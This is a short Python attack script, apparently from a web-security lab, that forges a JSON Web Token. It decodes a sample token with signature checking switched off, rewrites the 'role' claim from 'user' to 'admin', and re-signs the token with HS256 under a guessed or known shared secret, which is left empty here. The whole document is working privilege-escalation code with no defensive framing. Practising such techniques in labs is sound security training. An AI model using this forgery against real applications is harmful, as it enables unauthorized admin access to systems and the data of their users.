import jwt  # PyJWT library
import base64

# Original JWT token
original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpZW5lciIsInJvbGUiOiJ1c2VyIn0.vr_jy6fq4fN_h12mxsHnR0UENBPA9VURQ0cGVZ97zrc"

# Shared secret key (you must know this or guess it)
secret_key = ""

# Decode the token (without verifying signature)
decoded = jwt.decode(original_token, options={"verify_signature": False})
print("[*] Original payload:", decoded)

# Modify payload
decoded["role"] = "admin"

# Re-sign token with new payload
new_token = jwt.encode(decoded, secret_key, algorithm="HS256")

print("\n[+] Modified JWT:")
print(new_token)
